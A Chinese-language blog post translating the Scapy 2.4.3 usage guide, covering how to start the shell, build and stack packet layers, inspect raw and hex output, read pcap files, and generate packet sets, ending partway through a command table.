<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="python," />





  <link rel="alternate" href="/atom.xml" title="种菜园" type="application/atom+xml" />






<meta name="description" content="文档官网，大部分中文翻译来源。 UsageStarting ScapyScapy的交互式shell运行在终端中，要想发送packets，需要Root权限，所以Linux下需要sudo权限： 123$ sudo .&#x2F;scapyWelcome to Scapy (2.4.0)&gt;&gt;&gt;  : 123C:\&gt;scapyWelcome to Scapy (2.4.0)&gt;&gt;&amp;">
<meta property="og:type" content="article">
<meta property="og:title" content="scapy_usage_2.4.3中文翻译">
<meta property="og:url" content="https://iwannatobehappy.github.io/2019/11/11/scapy-usage-2-4-3%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/index.html">
<meta property="og:site_name" content="种菜园">
<meta property="og:description" content="文档官网，大部分中文翻译来源。 UsageStarting ScapyScapy的交互式shell运行在终端中，要想发送packets，需要Root权限，所以Linux下需要sudo权限： 123$ sudo .&#x2F;scapyWelcome to Scapy (2.4.0)&gt;&gt;&gt;  : 123C:\&gt;scapyWelcome to Scapy (2.4.0)&gt;&gt;&amp;">
<meta property="og:image" content="https://iwannatobehappy.github.io/2019/11/11/scapy-usage-2-4-3%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/1.gif">
<meta property="og:image" content="https://iwannatobehappy.github.io/2019/11/11/scapy-usage-2-4-3%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/fieldsmanagement.png">
<meta property="og:image" content="https://iwannatobehappy.github.io/2019/11/11/scapy-usage-2-4-3%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/isakmp_dump.png">
<meta property="og:image" content="https://iwannatobehappy.github.io/2019/11/11/scapy-usage-2-4-3%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/traceroute_worldplot.png">
<meta property="og:image" content="https://iwannatobehappy.github.io/2019/11/11/scapy-usage-2-4-3%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/animation-scapy-asyncsniffer.svg">
<meta property="og:image" content="https://iwannatobehappy.github.io/2019/11/11/scapy-usage-2-4-3%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/ipid.png">
<meta property="og:image" content="https://iwannatobehappy.github.io/2019/11/11/scapy-usage-2-4-3%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/graph_traceroute.png">
<meta property="og:image" content="https://iwannatobehappy.github.io/2019/11/11/scapy-usage-2-4-3%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/trace3d_1.png">
<meta property="og:image" content="https://iwannatobehappy.github.io/2019/11/11/scapy-usage-2-4-3%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/trace3d_2.png">
<meta property="article:published_time" content="2019-11-11T07:44:47.000Z">
<meta property="article:modified_time" content="2019-11-12T06:58:51.857Z">
<meta property="article:author" content="陈潇">
<meta property="article:tag" content="python">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://iwannatobehappy.github.io/2019/11/11/scapy-usage-2-4-3%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/1.gif">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://iwannatobehappy.github.io/2019/11/11/scapy-usage-2-4-3中文翻译/"/>





  <title>scapy_usage_2.4.3中文翻译 | 种菜园</title>
  








<meta name="generator" content="Hexo 4.2.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">种菜园</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://iwannatobehappy.github.io/2019/11/11/scapy-usage-2-4-3%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="陈潇">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="种菜园">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">scapy_usage_2.4.3中文翻译</h1>
        

        <div class="post-meta">
		  
		  
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-11T15:44:47+08:00">
                2019-11-11
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/11/11/scapy-usage-2-4-3%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/11/11/scapy-usage-2-4-3%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
            </span>
          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  14.1k
                </span>
              

              

              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><a href="https://scapy.readthedocs.io/en/latest/usage.html" target="_blank" rel="noopener">文档官网</a>，大部分<a href="https://github.com/Larryxi/Scapy_zh-cn" target="_blank" rel="noopener">中文翻译来源</a>。</p>
<h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><h2 id="Starting-Scapy"><a href="#Starting-Scapy" class="headerlink" title="Starting Scapy"></a>Starting Scapy</h2><p>Scapy的交互式shell运行在终端中，要想发送packets，需要Root权限，所以Linux下需要sudo权限：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ./scapy</span></span><br><span class="line">Welcome to Scapy (2.4.0)</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br></pre></td></tr></table></figure>

<p>:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;scapy</span><br><span class="line">Welcome to Scapy (2.4.0)</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果你没有安好所有可选包，Scapy将提示你一些函数无法使用：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INFO: Can't import python matplotlib wrapper. Won't be able to plot.</span><br><span class="line">INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().</span><br></pre></td></tr></table></figure>

<p>基础的发送数据包功能将依旧能用。</p>
<h3 id="Customizing-the-Terminal"><a href="#Customizing-the-Terminal" class="headerlink" title="Customizing the Terminal"></a>Customizing the Terminal</h3><p>在你开始使用Scapy之前，你可以配置字体颜色——只需要设置conf.color_theme为如下选项：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DefaultTheme, BrightTheme, RastaTheme, ColorOnBlackTheme, BlackAndWhite, HTMLTheme, LatexTheme</span><br></pre></td></tr></table></figure>

<p>例如:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conf.color_theme = BrightTheme()</span><br></pre></td></tr></table></figure>

<p><img src="1.gif" alt="_images/animation-scapy-themes-demo.gif"></p>
<p>其他参数，如conf.prompt，也可以提供一些定制。注意Scapy将在conf值更改后立即自动更新shell。</p>
<h2 id="交互式教程"><a href="#交互式教程" class="headerlink" title="交互式教程"></a>交互式教程</h2><p>以下将向你介绍一些简单的功能。</p>
<h3 id="First-steps"><a href="#First-steps" class="headerlink" title="First steps"></a>First steps</h3><p>咱来整个数据包:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; a=IP(ttl=10)</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; a</span></span><br><span class="line">&lt; IP ttl=10 |&gt;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; a.src</span></span><br><span class="line">’127.0.0.1’</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; a.dst=<span class="string">"192.168.1.1"</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; a</span></span><br><span class="line">&lt; IP ttl=10 dst=192.168.1.1 |&gt;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; a.src</span></span><br><span class="line">’192.168.8.14’</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; del(a.ttl)</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; a</span></span><br><span class="line">&lt; IP dst=192.168.1.1 |&gt;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; a.ttl</span></span><br><span class="line">64</span><br></pre></td></tr></table></figure>

<h3 id="Stacking-layers"><a href="#Stacking-layers" class="headerlink" title="Stacking layers"></a>Stacking layers</h3><p>操作符<code>/</code>用于两个layer之间，此时，底层将根据高层重载一个或多个字段（你仍可以对其赋值）。一个string可以被用作一个原生层。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>IP()</span><br><span class="line">&lt;IP |&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>IP()/TCP()</span><br><span class="line">&lt;IP frag=<span class="number">0</span> proto=TCP |&lt;TCP |&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Ether()/IP()/TCP()</span><br><span class="line">&lt;Ether type=<span class="number">0x800</span> |&lt;IP frag=<span class="number">0</span> proto=TCP |&lt;TCP |&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>IP()/TCP()/<span class="string">"GET / HTTP/1.0\r\n\r\n"</span></span><br><span class="line">&lt;IP frag=<span class="number">0</span> proto=TCP |&lt;TCP |&lt;Raw load=<span class="string">'GET / HTTP/1.0\r\n\r\n'</span> |&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Ether()/IP()/IP()/UDP()</span><br><span class="line">&lt;Ether type=<span class="number">0x800</span> |&lt;IP frag=<span class="number">0</span> proto=IP |&lt;IP frag=<span class="number">0</span> proto=UDP |&lt;UDP |&gt;&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>IP(proto=<span class="number">55</span>)/TCP()</span><br><span class="line">&lt;IP frag=<span class="number">0</span> proto=<span class="number">55</span> |&lt;TCP |&gt;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="fieldsmanagement.png" alt="_images/fieldsmanagement.png"></p>
<p>每个包都能被创造或切分（Python中<code>_</code>表示上条指令执行结果）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>raw(IP())</span><br><span class="line"><span class="string">'E\x00\x00\x14\x00\x01\x00\x00@\x00|\xe7\x7f\x00\x00\x01\x7f\x00\x00\x01'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>IP(_)</span><br><span class="line">&lt;IP version=<span class="number">4L</span> ihl=<span class="number">5L</span> tos=<span class="number">0x0</span> len=<span class="number">20</span> id=<span class="number">1</span> flags= frag=<span class="number">0L</span> ttl=<span class="number">64</span> proto=IP</span><br><span class="line"> chksum=<span class="number">0x7ce7</span> src=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> dst=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> |&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span> a=Ether()/IP(dst=<span class="string">"www.slashdot.org"</span>)/TCP()/<span class="string">"GET /index.html HTTP/1.0 \n\n"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span> hexdump(a)</span><br><span class="line"><span class="number">00</span> <span class="number">02</span> <span class="number">15</span> <span class="number">37</span> A2 <span class="number">44</span> <span class="number">00</span> AE F3 <span class="number">52</span> AA D1 <span class="number">08</span> <span class="number">00</span> <span class="number">45</span> <span class="number">00</span>  ..<span class="number">.7</span>.D...R....E.</span><br><span class="line"><span class="number">00</span> <span class="number">43</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">40</span> <span class="number">06</span> <span class="number">78</span> <span class="number">3</span>C C0 A8 <span class="number">05</span> <span class="number">15</span> <span class="number">42</span> <span class="number">23</span>  .C....@.x&lt;....B<span class="comment">#</span></span><br><span class="line">FA <span class="number">97</span> <span class="number">00</span> <span class="number">14</span> <span class="number">00</span> <span class="number">50</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">50</span> <span class="number">02</span>  .....P........P.</span><br><span class="line"><span class="number">20</span> <span class="number">00</span> BB <span class="number">39</span> <span class="number">00</span> <span class="number">00</span> <span class="number">47</span> <span class="number">45</span> <span class="number">54</span> <span class="number">20</span> <span class="number">2</span>F <span class="number">69</span> <span class="number">6</span>E <span class="number">64</span> <span class="number">65</span> <span class="number">78</span>   .<span class="number">.9</span>..GET /index</span><br><span class="line"><span class="number">2</span>E <span class="number">68</span> <span class="number">74</span> <span class="number">6</span>D <span class="number">6</span>C <span class="number">20</span> <span class="number">48</span> <span class="number">54</span> <span class="number">54</span> <span class="number">50</span> <span class="number">2</span>F <span class="number">31</span> <span class="number">2</span>E <span class="number">30</span> <span class="number">20</span> <span class="number">0</span>A  .html HTTP/<span class="number">1.0</span> .</span><br><span class="line"><span class="number">0</span>A                                               .</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b=raw(a)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line"><span class="string">'\x00\x02\x157\xa2D\x00\xae\xf3R\xaa\xd1\x08\x00E\x00\x00C\x00\x01\x00\x00@\x06x&lt;\xc0</span></span><br><span class="line"><span class="string"> \xa8\x05\x15B#\xfa\x97\x00\x14\x00P\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00</span></span><br><span class="line"><span class="string"> \xbb9\x00\x00GET /index.html HTTP/1.0 \n\n'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c=Ether(b)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c</span><br><span class="line">&lt;Ether dst=<span class="number">00</span>:<span class="number">02</span>:<span class="number">15</span>:<span class="number">37</span>:a2:<span class="number">44</span> src=<span class="number">00</span>:ae:f3:<span class="number">52</span>:aa:d1 type=<span class="number">0x800</span> |&lt;IP version=<span class="number">4L</span></span><br><span class="line"> ihl=<span class="number">5L</span> tos=<span class="number">0x0</span> len=<span class="number">67</span> id=<span class="number">1</span> flags= frag=<span class="number">0L</span> ttl=<span class="number">64</span> proto=TCP chksum=<span class="number">0x783c</span></span><br><span class="line"> src=<span class="number">192.168</span><span class="number">.5</span><span class="number">.21</span> dst=<span class="number">66.35</span><span class="number">.250</span><span class="number">.151</span> options=<span class="string">''</span> |&lt;TCP sport=<span class="number">20</span> dport=<span class="number">80</span> seq=<span class="number">0L</span></span><br><span class="line"> ack=<span class="number">0L</span> dataofs=<span class="number">5L</span> reserved=<span class="number">0L</span> flags=S window=<span class="number">8192</span> chksum=<span class="number">0xbb39</span> urgptr=<span class="number">0</span></span><br><span class="line"> options=[] |&lt;Raw load=<span class="string">'GET /index.html HTTP/1.0 \n\n'</span> |&gt;&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到被切分的数据包含所有被填充的字段，如果这太长了，可以用hide_defaults()函数去除其中与默认值相同的字段：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.hide_defaults()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c</span><br><span class="line">&lt;Ether dst=<span class="number">00</span>:<span class="number">0</span>f:<span class="number">66</span>:<span class="number">56</span>:fa:d2 src=<span class="number">00</span>:ae:f3:<span class="number">52</span>:aa:d1 type=<span class="number">0x800</span> |&lt;IP ihl=<span class="number">5L</span> len=<span class="number">67</span></span><br><span class="line"> frag=<span class="number">0</span> proto=TCP chksum=<span class="number">0x783c</span> src=<span class="number">192.168</span><span class="number">.5</span><span class="number">.21</span> dst=<span class="number">66.35</span><span class="number">.250</span><span class="number">.151</span> |&lt;TCP dataofs=<span class="number">5L</span></span><br><span class="line"> chksum=<span class="number">0xbb39</span> options=[] |&lt;Raw load=<span class="string">'GET /index.html HTTP/1.0 \n\n'</span> |&gt;&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Reading-PCAP-files"><a href="#Reading-PCAP-files" class="headerlink" title="Reading PCAP files"></a>Reading PCAP files</h3><p>你可以通过pcap文件读写数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=rdpcap(<span class="string">"/spare/captures/isakmp.cap"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">&lt;isakmp.cap: UDP:<span class="number">721</span> TCP:<span class="number">0</span> ICMP:<span class="number">0</span> Other:<span class="number">0</span>&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Graphical-dumps-PDF-PS"><a href="#Graphical-dumps-PDF-PS" class="headerlink" title="Graphical dumps (PDF, PS)"></a>Graphical dumps (PDF, PS)</h3><p> 如果您已经安装PyX，您可以做一个数据包的图形PostScript/ PDF转储（见下面丑陋的PNG图像，PostScript/PDF则具有更好的质量…） </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">423</span>].pdfdump(layer_shift=<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">423</span>].psdump(<span class="string">"/tmp/isakmp_pkt.eps"</span>,layer_shift=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><img src="isakmp_dump.png" alt="_images/isakmp_dump.png"></p>
<table>
<thead>
<tr>
<th align="left">Command</th>
<th align="center">Effect</th>
</tr>
</thead>
<tbody><tr>
<td align="left">raw(pkt)</td>
<td align="center">组装数据包</td>
</tr>
<tr>
<td align="left">hexdump(pkt)</td>
<td align="center">十六进制转储</td>
</tr>
<tr>
<td align="left">ls(pkt)</td>
<td align="center">显示出字段值的列表</td>
</tr>
<tr>
<td align="left">pkt.summary()</td>
<td align="center">一行摘要</td>
</tr>
<tr>
<td align="left">pkt.show()</td>
<td align="center">针对数据包的展开试图</td>
</tr>
<tr>
<td align="left">pkt.show2()</td>
<td align="center">显示聚合的数据包（例如，计算好了校验和）</td>
</tr>
<tr>
<td align="left">pkt.sprintf()</td>
<td align="center">用数据包字段填充格式字符串</td>
</tr>
<tr>
<td align="left">pkt.decode_payload_as()</td>
<td align="center">改变payload的decode方式</td>
</tr>
<tr>
<td align="left">pkt.psdump()</td>
<td align="center">绘制一个解释说明的PostScript图表</td>
</tr>
<tr>
<td align="left">pkt.pdfdump()</td>
<td align="center">绘制一个解释说明的PDF</td>
</tr>
<tr>
<td align="left">pkt.command()</td>
<td align="center">返回可以生成数据包的Scapy命令</td>
</tr>
</tbody></table>
<h3 id="Generating-sets-of-packets"><a href="#Generating-sets-of-packets" class="headerlink" title="Generating sets of packets"></a>Generating sets of packets</h3><p> 目前我们只是生成一个数据包。让我们看看如何轻易地定制一组数据包。整个数据包的每一个字段（甚至是网络层次）都可以是一组。在这里隐含地定义了一组数据包的概念，意即是使用所有区域之间的笛卡尔乘积来生成的一组数据包。 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=IP(dst=<span class="string">"www.slashdot.org/30"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">&lt;IP  dst=Net(<span class="string">'www.slashdot.org/30'</span>) |&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[p <span class="keyword">for</span> p <span class="keyword">in</span> a]</span><br><span class="line">[&lt;IP dst=<span class="number">66.35</span><span class="number">.250</span><span class="number">.148</span> |&gt;, &lt;IP dst=<span class="number">66.35</span><span class="number">.250</span><span class="number">.149</span> |&gt;,</span><br><span class="line"> &lt;IP dst=<span class="number">66.35</span><span class="number">.250</span><span class="number">.150</span> |&gt;, &lt;IP dst=<span class="number">66.35</span><span class="number">.250</span><span class="number">.151</span> |&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b=IP(ttl=[<span class="number">1</span>,<span class="number">2</span>,(<span class="number">5</span>,<span class="number">9</span>)])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">&lt;IP ttl=[<span class="number">1</span>, <span class="number">2</span>, (<span class="number">5</span>, <span class="number">9</span>)] |&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[p <span class="keyword">for</span> p <span class="keyword">in</span> b]</span><br><span class="line">[&lt;IP ttl=<span class="number">1</span> |&gt;, &lt;IP ttl=<span class="number">2</span> |&gt;, &lt;IP ttl=<span class="number">5</span> |&gt;, &lt;IP ttl=<span class="number">6</span> |&gt;,</span><br><span class="line"> &lt;IP ttl=<span class="number">7</span> |&gt;, &lt;IP ttl=<span class="number">8</span> |&gt;, &lt;IP ttl=<span class="number">9</span> |&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c=TCP(dport=[<span class="number">80</span>,<span class="number">443</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[p <span class="keyword">for</span> p <span class="keyword">in</span> a/c]</span><br><span class="line">[&lt;IP frag=<span class="number">0</span> proto=TCP dst=<span class="number">66.35</span><span class="number">.250</span><span class="number">.148</span> |&lt;TCP dport=<span class="number">80</span> |&gt;&gt;,</span><br><span class="line"> &lt;IP frag=<span class="number">0</span> proto=TCP dst=<span class="number">66.35</span><span class="number">.250</span><span class="number">.148</span> |&lt;TCP dport=<span class="number">443</span> |&gt;&gt;,</span><br><span class="line"> &lt;IP frag=<span class="number">0</span> proto=TCP dst=<span class="number">66.35</span><span class="number">.250</span><span class="number">.149</span> |&lt;TCP dport=<span class="number">80</span> |&gt;&gt;,</span><br><span class="line"> &lt;IP frag=<span class="number">0</span> proto=TCP dst=<span class="number">66.35</span><span class="number">.250</span><span class="number">.149</span> |&lt;TCP dport=<span class="number">443</span> |&gt;&gt;,</span><br><span class="line"> &lt;IP frag=<span class="number">0</span> proto=TCP dst=<span class="number">66.35</span><span class="number">.250</span><span class="number">.150</span> |&lt;TCP dport=<span class="number">80</span> |&gt;&gt;,</span><br><span class="line"> &lt;IP frag=<span class="number">0</span> proto=TCP dst=<span class="number">66.35</span><span class="number">.250</span><span class="number">.150</span> |&lt;TCP dport=<span class="number">443</span> |&gt;&gt;,</span><br><span class="line"> &lt;IP frag=<span class="number">0</span> proto=TCP dst=<span class="number">66.35</span><span class="number">.250</span><span class="number">.151</span> |&lt;TCP dport=<span class="number">80</span> |&gt;&gt;,</span><br><span class="line"> &lt;IP frag=<span class="number">0</span> proto=TCP dst=<span class="number">66.35</span><span class="number">.250</span><span class="number">.151</span> |&lt;TCP dport=<span class="number">443</span> |&gt;&gt;]</span><br></pre></td></tr></table></figure>

<p> 某些操作（如修改一个数据包中的字符串）无法对于一组数据包使用。在这些情况下，如果您忘记展开您的数据包集合，只有您忘记生成的列表中的第一个元素会被用于组装数据包。 </p>
<table>
<thead>
<tr>
<th>Command</th>
<th align="center">Effect</th>
